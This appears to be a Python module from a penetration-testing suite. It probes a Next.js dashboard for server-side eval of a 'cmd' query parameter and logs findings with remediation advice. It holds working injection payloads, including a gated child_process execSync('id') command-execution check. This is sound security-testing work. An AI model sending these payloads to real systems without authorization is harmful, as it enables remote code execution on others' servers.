from __future__ import annotations

import urllib.parse
from typing import Dict, Optional

from bs4 import BeautifulSoup

from redteamsuite.core.context import TargetContext
from redteamsuite.core.models import Finding
from redteamsuite.core.utils import normalize_url


class NextJsEvalTester:
    def __init__(self, ctx: TargetContext):
        self.ctx = ctx

    def run_expression(self, base_url: str, dashboard_path: str, expression: str) -> Dict[str, object]:
        encoded = urllib.parse.quote(expression, safe="")
        url = normalize_url(base_url, dashboard_path) + f"?cmd={encoded}"
        self.ctx.logger.event("nextjs.expr", f"Testing expression: {expression}")
        result = self.ctx.http.get(url, allow_redirects=False)
        output = self._extract_pre(result.text)
        return {
            "expression": expression,
            "url": url,
            "status_code": result.status_code,
            "output": output,
            "evidence_id": result.evidence_id,
        }

    def safe_eval_checks(self, base_url: str, dashboard_path: str) -> Dict[str, object]:
        checks = {
            "arithmetic": self.run_expression(base_url, dashboard_path, "1+1"),
            "node_version": self.run_expression(base_url, dashboard_path, "process.version"),
            "cwd": self.run_expression(base_url, dashboard_path, "process.cwd()"),
        }
        arithmetic_ok = checks["arithmetic"].get("output") == "2"
        node_ok = str(checks["node_version"].get("output") or "").startswith("v")
        if arithmetic_ok and node_ok:
            self.ctx.evidence.findings.append(Finding(
                id="NEXT-EVAL-001",
                title="Unauthenticated server-side JavaScript evaluation",
                severity="Critical",
                target=normalize_url(base_url, dashboard_path),
                description="The Next.js dashboard evaluates the cmd query parameter as server-side JavaScript.",
                impact="An unauthenticated attacker can evaluate arbitrary JavaScript in the Node.js server context.",
                remediation="Remove eval() from request-controlled input, implement allowlisted diagnostic operations, and require authentication/authorization for health endpoints.",
                evidence_ids=[str(v["evidence_id"]) for v in checks.values()],
                metadata={"outputs": {k: v.get("output") for k, v in checks.items()}},
            ))
        self.ctx.evidence.save_json("nextjs_eval_checks.json", checks)
        self.ctx.evidence.flush()
        return checks

    def command_execution_check(self, base_url: str, dashboard_path: str) -> Optional[Dict[str, object]]:
        if not self.ctx.config.allow_code_exec_validation:
            self.ctx.logger.event("nextjs.skip", "Skipping command execution validation because allow_code_exec_validation is false")
            return None
        expr = 'process.mainModule.require("child_process").execSync("id").toString()'
        result = self.run_expression(base_url, dashboard_path, expr)
        output = str(result.get("output") or "")
        if "uid=" in output:
            self.ctx.evidence.findings.append(Finding(
                id="NEXT-RCE-001",
                title="Next.js eval allows OS command execution",
                severity="Critical",
                target=normalize_url(base_url, dashboard_path),
                description="The server-side JavaScript evaluation can access child_process and execute operating system commands.",
                impact="An unauthenticated attacker can execute OS commands in the privileges of the Next.js service account.",
                remediation="Remove server-side eval on user input, restrict process privileges, and run services as non-root users.",
                evidence_ids=[str(result["evidence_id"])],
                metadata={"output": output},
            ))
        self.ctx.evidence.save_json("nextjs_command_exec_check.json", result)
        self.ctx.evidence.flush()
        return result

    @staticmethod
    def _extract_pre(html: str) -> Optional[str]:
        soup = BeautifulSoup(html, "html.parser")
        pre = soup.find("pre")
        if not pre:
            return None
        return pre.get_text().strip()
